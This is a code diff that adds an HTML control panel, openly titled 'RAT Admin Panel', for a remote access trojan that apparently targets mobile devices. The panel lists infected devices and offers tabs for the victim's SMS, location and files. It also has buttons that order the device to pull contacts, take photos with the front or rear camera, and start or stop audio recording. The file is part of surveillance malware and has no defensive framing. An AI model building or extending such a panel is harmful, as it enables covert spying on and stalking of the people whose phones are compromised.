@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>RAT Admin</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://unpkg.com/@supabase/supabase-js"></script>
+</head>
+<body>
+    <h1>RAT Admin Panel</h1>
+    <div id="device-list"><h2>Devices</h2><div id="device-list-content"></div></div>
+    <div id="device-details" style="display:none;">
+        <h2 id="device-name"></h2>
+        <div class="tabs">
+            <button class="active" onclick="showTab('info')">Info</button>
+            <button onclick="showTab('sms')">SMS</button>
+            <button onclick="showTab('location')">Location</button>
+            <button onclick="showTab('files')">Files</button>
+            <button onclick="showTab('commands')">Commands</button>
+        </div>
+        <div id="info-tab" class="tab-content active"></div>
+        <div id="sms-tab" class="tab-content"></div>
+        <div id="location-tab" class="tab-content"></div>
+        <div id="files-tab" class="tab-content"></div>
+        <div id="commands-tab" class="tab-content">
+            <button onclick="sendCommand('get_contacts')">Get Contacts</button>
+            <button onclick="sendCommand('capture_camera_front')">Capture Front Cam</button>
+            <button onclick="sendCommand('capture_camera_rear')">Capture Rear Cam</button>
+            <button onclick="sendCommand('start_audio')">Start Audio</button>
+            <button onclick="sendCommand('stop_audio')">Stop Audio</button>
+            <div id="command-output"></div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
